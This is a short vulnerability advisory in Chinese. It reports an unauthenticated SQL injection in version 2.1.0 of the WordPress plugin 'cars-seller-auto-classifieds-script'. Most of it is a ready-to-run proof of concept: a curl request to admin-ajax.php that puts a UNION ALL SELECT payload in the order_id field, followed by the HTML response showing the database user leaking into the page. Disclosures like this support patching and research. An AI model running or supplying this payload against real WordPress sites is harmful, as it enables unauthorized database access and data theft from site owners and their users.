簡介
----

插件名稱：wp-plugin：cars-seller-auto-classifieds-script

受影響的版本：2.1.0（如果有，則可能是較低版本）

漏洞：注入

所需的最低訪問級別：未認證

POC
---

    curl 'http://<Hostname>/wp-admin/admin-ajax.php' \
      --data-raw 'action=request_list_request&order_id=-1662 UNION ALL SELECT NULL,NULL,current_user(),current_user(),current_user(),NULL,current_user(),current_user(),NULL-- -' \
      --compressed \
      --insecure


         <h1>Request Details</h1>
            <table style=" border: 1px solid #999;width:96%" class="order_detail">
                <tr>
                    <td>Request Id</td><td></td>
                </tr>
                <tr>
                    <td>Car Title</td><td>Untitled</td>
                </tr>
                <tr>
                    <td>Name</td><td>bob@localhost bob@localhost</td>
                </tr>
                <tr>
                    <td>Email</td><td>bob@localhost</td>
                </tr>
                <tr>
                    <td>Phone</td><td>bob@localhost</td>
                </tr>
                <tr>
                    <td>Message</td><td>bob@localhost</td>
                </tr>
                <tr>
                    <td colspan="2" align="center"><a href="mailto:bob@localhost" style="background: #2ea2cc;border-color: #0074a2;-webkit-box-shadow: inset 0 1px 0 rgba(120,200,230,.5),0 1px 0 rgba(0,0,0,.15);box-shadow: inset 0 1px 0 rgba(120,200,230,.5),0 1px 0 rgba(0,0,0,.15);color: #fff;text-decoration: none;vertical-align: baseline;display: inline-block;text-decoration: none;font-size: 13px;line-height: 26px;height: 28px;margin: 0;padding: 0 10px 1px;cursor: pointer;border-width: 1px;
    border-style: solid;-webkit-appearance: none;-webkit-border-radius: 3px;border-radius: 3px;white-space: nowrap;-webkit-box-sizing: border-box;-moz-box-sizing: border-box;box-sizing: border-box;">Reply</a></td>

                </tr>

            </table>
            <p style="margin-top:20px; text-align:right;"><a href="#" id="close">Close</a></p>